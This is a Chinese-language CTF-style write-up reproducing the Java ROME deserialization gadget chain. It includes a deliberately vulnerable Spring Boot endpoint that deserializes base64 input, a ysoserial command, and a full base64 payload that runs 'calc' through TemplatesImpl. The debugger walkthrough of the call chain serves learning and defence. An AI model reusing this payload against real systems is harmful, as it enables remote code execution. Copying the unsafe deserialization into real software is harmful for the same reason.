# Java ROME反序列化链复现

## 0、知识点

>   ROME会利用到一个关键的类就是==ObjectBean==

-   这个类是在：`com.sun.syndication.feed.impl.ObjectBean`中，是`rome`提供的一个封装类型

    -   它实现了`Serializable`接口，定义了三个私有的成员变量，

    -   ```java
        private EqualsBean _equalsBean;
        private ToStringBean _toStringBean;
        private CloneableBean _cloneableBean;
        ```

    -   进而涉及了同目录下的另外三个类，然后这个`ObjectBean`也提供了一些访问另外三个类的方法

        ```java
        public boolean equals(Object other) {
        	return this._equalsBean.beanEquals(other);
        }
        public Object clone() throws CloneNotSupportedException {
        	return this._cloneableBean.beanClone();
        }
        public String toString() {
        	return this._toStringBean.toString();
        }
        public int hashCode() {
        	return this._equalsBean.beanHashCode();
        }
        ```

    -   **初始化时提供了一个`Class`类型和一个`Object`对象实例进行封装**

    -   ```java
        public ObjectBean(Class beanClass, Object obj) {
        	this(beanClass, obj, (Set)null);
        }
        ```

>   另一个关键的类就是==ToStringBean==

-   这个类是在：`com.sun.syndication.feed.impl.ToStringBean`，是给对象提供`toString`方法的类
-   类中有两个`toString`方法
    -   一个是无参方法，它会获取调用链中上一个类或`_obj`属性中保存对象的类名，并调用第二个`toString`方法
    -   第二个`toString`方法会调用`BeanIntrospector.getPropertyDescriptors`来获取`_beanClass`的所有`getter`和`setter`方法
        -   然后判断参数的长度，长度为0的方法会调用`_obj`实例进行反射调用，通过这个点我们可以来触发`TemplatesImpl`的利用链
        -   其中`_obj` 的定义是 `private Object _obj;`



## 1、环境搭建

>   初始化一个springboot项目，然后在`pom.xml`中导入`rome`依赖

```xml
<dependency>
    <groupId>rome</groupId>
    <artifactId>rome</artifactId>
    <version>1.0</version>
</dependency>
```

>   创建一个入口函数来触发反序列漏洞，新建一个`controller`文件夹，然后创建`testController`

```java
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;

@Controller
public class testController {
    
    @RequestMapping("/")
    public String helloCTF() throws IOException, ClassNotFoundException {

        String EXP = "";

        if (EXP.equals(""))
            return "Do you know Rome Serializer?";
        byte[] exp = Base64.getDecoder().decode(EXP);
        ByteArrayInputStream bytes = new ByteArrayInputStream(exp);
        ObjectInputStream objectInputStream = new ObjectInputStream(bytes);
        objectInputStream.readObject();
        return "Do You like Jvav?";
    }
}

```

>   使用`ysoserial`生成一个弹出计算器的`payload`

```bash
java -jar ysoserial-master-8eb5cbfbf6-1.jar ROME 'calc' | base64
```

```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEABGNhbGMIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBACB5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MQEAIkx5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB+AB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB+ACNxAH4ADXEAfgAGcQB+AAZxAH4ABng=
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221207211752.png)

>   成功弹出计算器

## 2、利用链分析

**`ysoserial`中的调用链的顺序如下**

```java
TemplatesImpl.getOutputProperties()
NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
NativeMethodAccessorImpl.invoke(Object, Object[])
DelegatingMethodAccessorImpl.invoke(Object, Object[])
Method.invoke(Object, Object...)
ToStringBean.toString(String)
ToStringBean.toString()
ObjectBean.toString()
EqualsBean.beanHashCode()
ObjectBean.hashCode()

HashMap<K,V>.hash(Object)
HashMap<K,V>.readObject(ObjectInputStream)
```
>   在`入口函数中`设置一个断点然后开始调试，然后进入点击下一步

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212080956028.png)

>   然后就会跑到`ObjectBean类的hashCode()`方法这里
>
>   因为`_equalsBean`属性是`EqualsBean类`的对象，所以接下来跑到`EqualsBean类`执行`beanHashCode()方法`

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221208095824.png)

>   在然后就会调用`_obj.toString().hashCode()方法`，`_obj是Object类的对象`，然后先进入`_obj.toString()`方法，

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212081003550.png)

>   可以发现进入了`ObjectBean类中的toString()`方法，它会调用`toStringBean类中的toString()方法`

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212081033559.png)

>   点击下一步，进入`toStringBean类中`，

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212081036365.png)

>   进行调试可以发现它获取了一个类名为`TemplatesImpl`的前缀，接着会调用`带参的toString()重载`方法，将prefix作为参数传入

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212081052309.png)

>   这里` BeanIntrospector.getPropertyDescriptors(_beanClass)`，它会获取传入的类的 `getters 与 setters`方法 
>
>   然后循环判断参数长度，获取`getter`方法，**过滤掉**`Object的getter`方法，**过滤掉**`带参数的getter`方法
>
>   满足这两个条件后会调用`invoke`方法
>
>   也包括了`getOutputProperties`这个方法

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212081058685.png)

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212081102285.png)

>   后面的步骤就是`TemplatesImpl`这个调用链了

```java
getOutputProperties
    newTransformer
        getTransletInstance
            defineTransletClasses
```

>   最终完整的调用链就是

**1、`objectInputStream.readObject()`**

```java
public static void main(String[] args) throws IOException, ClassNotFoundException {
		String EXP = "";
        byte[] exp = Base64.getDecoder().decode(EXP);
        ByteArrayInputStream bytes = new ByteArrayInputStream(exp);
        ObjectInputStream objectInputStream = new ObjectInputStream(bytes);
        objectInputStream.readObject();
        return;
    }

```

**2、`ObjectInputStream.readObject()`**

```java
public final Object readObject(){
    try {
        Object obj = readObject0(false);
    }
}
```

3、`ObjectInputStream.readObject0()`

```JAVA
private Object readObject0(boolean unshared) throws IOException {
    try {
        switch (tc) {
            case TC_OBJECT:
                return checkResolve(readOrdinaryObject(unshared));
        }
    }
}
```

4、`ObjectInputStream.readOrdinaryObject()`

```

```



```java
private void readObject(java.io.ObjectInputStream s)throws IOException, ClassNotFoundException {
    // Read the keys and values, and put the mappings in the HashMap
    for (int i = 0; i < mappings; i++) {
        @SuppressWarnings("unchecked")
        K key = (K) s.readObject();
        @SuppressWarnings("unchecked")
        V value = (V) s.readObject();
        putVal(hash(key), key, value, false, false);
    }
}
```

4、`HashMap.hash()`

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```



```java
objectInputStream.readObject();
    ObjectBean.hashCode()
            EqualsBean.beanHashCode()
                ObjectBean.toString()
                    ToStringBean.toString()
                        TemplatesImpl.getOutputProperties()
                        	newTransformer
                            	getTransletInstance
                            		defineTransletClasses
```









https://xz.aliyun.com/t/11200

https://cn-sec.com/archives/995687.html

https://www.yulate.com/292.html
